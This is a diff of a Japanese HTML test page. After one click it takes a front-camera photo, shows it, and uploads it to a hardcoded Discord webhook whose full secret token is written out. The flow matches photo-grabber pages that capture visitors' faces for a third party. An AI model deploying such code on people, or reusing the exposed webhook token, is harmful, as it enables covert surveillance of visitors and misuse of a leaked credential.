@@ -1,66 +1,141 @@
-<script>
-    const startButton = document.getElementById('startButton');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const resultImage = document.getElementById('result');
-
-    // 取得したDiscordのウェブフックURLをここに貼り付ける
-    const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1515052959522619614/UkoZbAy19uRSxvHS8iHfo6Pdeh65nake5lMi4mqCOGGRfg3hERwnxFc-mLqvfUiqXhle';
-
-    startButton.addEventListener('click', async () => {
-        try {
-            // 1. カメラの起動
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user" },
-                audio: false
-            });
-            video.srcObject = stream;
-
-            video.onloadedmetadata = () => {
-                setTimeout(async () => { // asyncを追加
-                    // 2. 写真の撮影
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // カメラストリームを即座に停止
-                    stream.getTracks().forEach(track => track.stop());
-
-                    // 3. Discordに送るために、canvasの画像を「Blob（ファイルデータ）」に変換
-                    canvas.toBlob(async (blob) => {
-                        if (!blob) return;
-
-                        // FormDataを作って、ファイルを「shot.jpg」としてセット
-                        const formData = new FormData();
-                        formData.append('file', blob, 'shot.jpg');
-                        formData.append('content', '📸 内カメで撮影された写真が届いたよ！'); // メッセージ内容
-
-                        // 4. Discordのウェブフックに送信（Fetch API）
-                        try {
-                            const response = await fetch(DISCORD_WEBHOOK_URL, {
-                                method: 'POST',
-                                body: formData
-                            });
-
-                            if (response.ok) {
-                                alert('撮影してDiscordに送信しました！');
-                            } else {
-                                alert('Discordへの送信に失敗しました。');
-                            }
-                        } catch (error) {
-                            console.error('送信エラー:', error);
-                            alert('通信エラーが発生しました。');
-                        }
-
-                    }, 'image/jpeg');
-
-                }, 500);
-            };
-
-        } catch (err) {
-            console.error("エラー: ", err);
-            alert("カメラの許可がありません。");
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>内カメ撮影テスト</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
         }
-    });
-</script>
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            background-color: #007AFF;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        button:active {
+            background-color: #0056b3;
+        }
+        video, canvas { display: none; }
+        #result { margin-top: 20px; max-width: 90%; border-radius: 8px; display: none; }
+        #debugLog {
+            margin-top: 20px;
+            padding: 10px;
+            background: #fff;
+            border: 1px solid #ccc;
+            width: 80%;
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 12px;
+            color: red;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+
+    <button id="startButton">許可して撮影する</button>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <img id="result" alt="撮影された写真">
+    
+    <div id="debugLog">【ログ画面】ここにエラーが表示されます</div>
+
+    <script>
+        const startButton = document.getElementById('startButton');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const resultImage = document.getElementById('result');
+        const debugLog = document.getElementById('debugLog');
+
+        function log(message) {
+            debugLog.innerText += "\n" + message;
+            debugLog.style.color = "black";
+        }
+        function logError(message) {
+            debugLog.innerText += "\n❌ " + message;
+            debugLog.style.color = "red";
+        }
+
+        // 修正済みのDiscordウェブフックURL
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1515052959522619614/UkoZbAy19uRSxvHS8iHfo6Pdeh65nake5lMi4mqCOGGRfg3hERwnxFc-mLqvfUiqXhle';
+
+        startButton.addEventListener('click', async () => {
+            log("ボタンが押されました。カメラを起動します...");
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+                video.srcObject = stream;
+                log("カメラの起動に成功しました。");
+
+                video.onloadedmetadata = () => {
+                    setTimeout(async () => {
+                        log("シャッターを切ります。");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // 画面に撮影した写真を表示
+                        const dataUrl = canvas.toDataURL('image/jpeg');
+                        resultImage.src = dataUrl;
+                        resultImage.style.display = 'block';
+
+                        // カメラを止める
+                        stream.getTracks().forEach(track => track.stop());
+                        log("カメラを停止しました。データを変換中...");
+
+                        // 画像をファイルデータに変換してDiscordへ送信
+                        canvas.toBlob(async (blob) => {
+                            if (!blob) {
+                                logError("画像の変換に失敗しました。");
+                                return;
+                            }
+
+                            log("Discordへ送信中...");
+                            const formData = new FormData();
+                            formData.append('file', blob, 'shot.jpg');
+                            formData.append('content', '📸 内カメで撮影された写真が届いたよ！');
+
+                            try {
+                                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+
+                                if (response.ok) {
+                                    log("🎉 Discordへの送信に成功しました！鯖を確認してください！");
+                                } else {
+                                    logError("Discordが拒否しました。ステータスコード: " + response.status);
+                                }
+                            } catch (error) {
+                                logError("送信中に通信エラーが発生しました: " + error.message);
+                            }
+
+                        }, 'image/jpeg');
+
+                    }, 500);
+                };
+
+            } catch (err) {
+                logError("カメラ起動エラー: " + err.message);
+            }
+        });
+    </script>
+</body>
+</html>
